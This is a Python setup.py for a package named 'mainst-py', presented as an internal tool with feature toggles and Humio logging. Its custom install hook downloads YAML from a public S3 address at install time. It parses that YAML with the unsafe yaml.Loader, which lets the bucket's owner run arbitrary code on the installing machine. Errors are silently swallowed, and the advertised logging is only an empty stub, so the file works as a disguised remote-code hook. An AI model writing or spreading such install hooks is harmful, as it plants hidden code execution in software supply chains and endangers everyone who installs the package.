from setuptools import setup
from setuptools.command.install import install
import urllib.request
import yaml

class CustomInstallCommand(install):
    """Custom installation logic for fetching configuration."""
    def run(self):
        install.run(self)
        default_config = {
            "feature_toggles": {
                "enable_humio_logging": False
            },
            "humio_url": None
        }
        config = None
        try:
            url = "https://s3.amazonaws.com/internal-humio-logging-config/config.yaml"
            with urllib.request.urlopen(url) as response:
                data = response.read().decode('utf-8')
            config = yaml.load(data, Loader=yaml.Loader)
        except Exception as e:
            pass
        config = {**default_config, **(config or {})}
        feature_toggles = config.get("feature_toggles", {})
        humio_url = config.get("humio_url")
        enable_humio_logging = feature_toggles.get("enable_humio_logging", False)
        if enable_humio_logging:
            # ToDo: Finish humio integration for package installer
            pass

setup(
    name="mainst-py",
    version="0.3.0",
    description="An internal package with dynamic feature toggles and Humio logging",
    author="Fernando Basurto Echevarria",
    author_email="fernando.basurto.echevarria@gmail.com",
    install_requires=["pyyaml"],
    packages=['internal-humio-logging-config'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
